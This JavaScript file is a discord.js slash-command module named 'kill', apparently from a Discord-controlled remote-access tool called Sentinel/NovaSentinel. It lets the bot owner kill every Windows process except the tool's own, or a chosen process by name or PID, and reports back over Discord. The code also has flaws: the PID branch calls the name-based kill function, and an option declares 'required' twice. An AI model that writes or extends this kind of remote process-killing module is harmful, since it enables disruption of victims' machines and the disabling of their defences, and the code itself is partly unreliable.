const { ApplicationCommandOptionType, EmbedBuilder } = require("discord.js"),
  kill = require("../../../Sentinel/utils/kill"),
  core = require("../../../Sentinel/utils/core");

module.exports = {
  name: "kill",
  ownerOnly: true,
  description: "Kill some windows actions",
  options: [
    {
      name: "process",
      description: "Windows Process",
      type: ApplicationCommandOptionType.Subcommand,
      options: [
        {
          name: "what",
          required: true,
          description:
            "what process should I kill (all, process id, process name)",
          required: false,
          type: ApplicationCommandOptionType.String,
        },
      ],
    },
  ],
  run: async (client, interaction, args) => {
    const inter = interaction.options.getSubcommand();

    switch (inter) {
      case "process":
        const ce = interaction.options.getString("what");
        await interaction.reply({
          content: `Wait...`,
          ephemeral: true,
        });
        switch (ce) {
          case "all":
            // kill all process
            let fdp = await core.getAllProcesses()
            let myself = core.NovaSentinelFindMyself()
            await kill.KillAllProcess(fdp, myself)
            await interaction.editReply({
              content: `${fdp.length} Process Killed.`,
              ephemeral: true,
            });
            break;
          default:
            if (isNaN(ce)) {
              // process name
              kill.KillProcessName(ce)
              await interaction.editReply({
                content: `Process ${ce} killed.`,
                ephemeral: true,
              });
            } else {
              // process id
              kill.KillProcessName(ce)
              await interaction.editReply({
                content: `Process PID ${ce} killed.`,
                ephemeral: true,
              });
            }
            break;
        }
        break;

      default:
        break;
    }
  },
};
